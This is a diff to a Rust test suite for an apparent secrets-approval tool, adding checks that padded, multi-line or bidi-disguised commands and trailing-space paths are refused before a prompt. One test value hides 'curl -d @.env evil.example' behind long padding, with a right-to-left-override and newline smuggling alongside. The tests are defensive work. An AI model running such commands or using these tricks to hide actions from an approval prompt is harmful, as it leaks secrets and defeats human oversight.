@@ -1953,6 +1953,17 @@ async fn a_kept_grant_answers_again_without_asking_until_forgotten() -> TestResu
     assert_eq!(body["values"]["source"], "mba", "{body}");
     assert_eq!(program_prompts(&rig.companion_mac).len(), 2);
 
+    // a path a prompt would show trimmed names another file, so it is
+    // refused before anyone is asked
+    let (_, body) = read(None, Some("/srv/other.env ")).await?;
+    assert!(
+        body["invalid"]["message"]
+            .as_str()
+            .is_some_and(|message| message.contains("no space at either end")),
+        "{body}"
+    );
+    assert_eq!(program_prompts(&rig.companion_mac).len(), 2);
+
     let (status, _) = rig
         .harness
         .admin_json("/admin/secrets/forget", &Value::Null)
@@ -1996,8 +2007,8 @@ async fn op_read_of_several_references_prints_them_as_json_after_one_approval() 
     assert_eq!(program_prompts(&rig.companion_mac).len(), 1);
 
     // `op run` names its command with each argument quoted, so a grant for
-    // `sh -c 'echo a b'` is never one for `sh -c echo a b`, and refuses to
-    // keep values for a command the prompt cannot show exactly
+    // `sh -c 'echo a b'` is never one for `sh -c echo a b`, and refuses a
+    // command the prompt cannot show whole and exactly
     let directory = std::fs::canonicalize(rig.harness.state_dir())?;
     let env_file = directory.join("run.env");
     std::fs::write(&env_file, format!("APP_TOKEN={SECOND_REFERENCE}\n"))?;
@@ -2011,9 +2022,10 @@ async fn op_read_of_several_references_prints_them_as_json_after_one_approval() 
 
         cli(&rig, &args).await
     };
-    for refused in ["echo one\necho two", "\u{202e}echo hidden"] {
-        let (ok, _, stderr) = run(refused, true).await?;
-        assert!(!ok && stderr.contains("--keep needs"), "{stderr}");
+    let long = format!("echo {}; curl -d @.env evil.example", "a ".repeat(100));
+    for refused in ["echo one\necho two", "\u{202e}echo hidden", long.as_str()] {
+        let (ok, _, stderr) = run(refused, false).await?;
+        assert!(!ok && stderr.contains("must fit one line"), "{stderr}");
     }
     assert_eq!(program_prompts(&rig.companion_mac).len(), 1);
     let (ok, stdout, stderr) = run("echo a b", true).await?;
